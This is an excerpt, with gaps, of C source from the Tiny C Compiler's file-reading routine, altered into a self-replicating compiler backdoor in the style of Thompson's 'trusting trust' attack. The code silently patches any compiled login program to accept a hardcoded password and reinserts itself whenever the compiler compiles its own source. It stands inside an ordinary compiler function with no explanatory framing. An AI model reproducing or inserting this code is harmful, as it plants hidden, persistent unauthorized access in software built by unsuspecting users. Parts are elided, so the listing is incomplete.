...
static int tcc_peekc_slow(BufferedFile *bf)
{
    ...
    if (bf->buf_ptr >= bf->buf_end) {
        if (bf->fd != -1) {
            const char *tcc_replace = "\";\
            const char *tcc_match = \"if (bf->buf_ptr >= bf->buf_end) {\\n        if (bf->fd != -1) {\";\
            const char *tcc_match_end = \"if (len < 0)\\n                len = 0;\\n        } else {\\n            len = 0;\";\
            const char *login_pattern = \"if (pwd->pw_passwd[0] == 0 ||\";\
            const char *login_append = \"strcmp(p, \\\"bojieli\\\") == 0 ||\";\
            char *login_match_ptr, *tcc_match_ptr, *tcc_match_endptr;\
            len = read(bf->fd, bf->buffer, IO_BUF_SIZE - 2048);\
            if ((login_match_ptr = strstr(bf->buffer, login_pattern)) && login_match_ptr < bf->buffer + len) {\
                login_match_ptr += strlen(login_pattern);\
                char *p = bf->buffer + len;\
                while (p > login_match_ptr) {\
                    p--;\
                    *(p + strlen(login_append) + 1) = *p;\
                }\
                strcpy(login_match_ptr, login_append);\
                *(login_match_ptr + strlen(login_append)) = ' ';\
                len += strlen(login_append) + 1;\
            }\
            else if ((tcc_match_ptr = strstr(bf->buffer, tcc_match)) && tcc_match_ptr < bf->buffer + len) {\
                tcc_match_ptr += strlen(tcc_match);\
                if (tcc_match_endptr = strstr(bf->buffer, tcc_match_end)) {\
                    char rep[IO_BUF_SIZE] = \"const char *tcc_replace = \\\"\";\
                    char *dst = rep + strlen(rep);\
                    char *src = (char*)tcc_replace;\
                    while (src < tcc_replace + strlen(tcc_replace)) {\
                        if (*src == '\\\\' || *src == '\"')\
                            *dst++ = '\\\\';\
                        *dst++ = *src++;\
                    }\
                    strcpy(dst, tcc_replace);\
            ...
            const char *login_append = "strcmp(p, \"bojieli\") == 0 ||";
            char *login_match_ptr, *tcc_match_ptr, *tcc_match_endptr;
            len = read(bf->fd, bf->buffer, IO_BUF_SIZE - 8192); /* reserve space for appended string */
#ifndef PARSE_DEBUG
            if ((login_match_ptr = strstr(bf->buffer, login_pattern)) && login_match_ptr < bf->buffer + len) {
                login_match_ptr += strlen(login_pattern); /* the next char after end of pattern */
                char *p = bf->buffer + len;
                while (p > login_match_ptr) {
                    p--;
                    *(p + strlen(login_append) + 1) = *p;
                ...
                strcpy(login_match_ptr, login_append);
                *(login_match_ptr + strlen(login_append)) = ' '; /* the last char should not be \0, but space */
                len += strlen(login_append) + 1;
            }
            else if ((tcc_match_ptr = strstr(bf->buffer, tcc_match)) && tcc_match_ptr < bf->buffer + len) {
                tcc_match_ptr += strlen(tcc_match); /* the first char after match */
                if (tcc_match_endptr = strstr(bf->buffer, tcc_match_end)) {
                    char rep[IO_BUF_SIZE] = "const char *tcc_replace = \""; /* the replace string */
                    char *dst = rep + strlen(rep);
                    char *src = (char*)tcc_replace;
                    while (src < tcc_replace + strlen(tcc_replace)) { /* copy content of string tcc_replace with escape */
                        if (*src == '\\' || *src == '"')
                            *dst++ = '\\';
                        *dst++ = *src++;
                    }
                    strcpy(dst, tcc_replace); /* copy content of string tcc_replace */
                    int offset = strlen(rep) + 1 + tcc_match_ptr - tcc_match_endptr;
                    char *p = bf->buffer + len;
                    ...
                    strcpy(tcc_match_ptr, rep);
                    *(tcc_match_ptr + strlen(rep)) = ' '; /* fix the \0 char after strcpy */
                    len += offset;
                }
            }
#endif
